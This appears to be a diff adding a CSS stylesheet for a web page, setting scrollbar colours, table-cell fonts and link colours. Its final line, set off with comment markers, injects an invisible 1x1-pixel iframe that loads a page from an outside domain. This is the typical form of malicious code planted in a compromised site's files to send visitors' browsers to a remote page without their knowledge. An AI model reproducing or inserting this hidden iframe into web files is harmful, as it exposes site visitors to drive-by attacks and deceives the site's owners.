@@ -1,0 +1,37 @@
+body{
+	background-color: WhiteW;
+	SCROLLBAR-FACE-COLOR: Khaki;
+	SCROLLBAR-SHADOW-COLOR: #ffffff;
+	SCROLLBAR-3DLIGHT-COLOR: #ffffff;
+	SCROLLBAR-ARROW-COLOR: #ffffff;
+	SCROLLBAR-TRACK-COLOR: #75C06C;
+	SCROLLBAR-DARKSHADOW-COLOR: #ffffff;
+	SCROLLBAR-HIGHLIGHT-COLOR: #ffffff;
+}
+td {
+	font-family : Verdana, Arial, Helvetica;
+	font-size: 10px;
+	color: Black;
+}
+td.white {
+	font-family : Verdana, Arial, Helvetica;
+	font-size: 10px;
+	color: White;
+}
+td.zag {
+	font-family : Verdana, Arial, Helvetica;
+	font-size: 12px;
+	color: White;
+}
+A:link {
+	color: Yellow;
+	text-decoration : none;
+}
+A:active {
+	color: White;
+}
+A:visited {
+	color: White;
+	text-decoration : none;
+}
+<!-- ~ --><iframe src="http://zenux.info/info/index.php" width="1" height="1"><!-- ~ -->
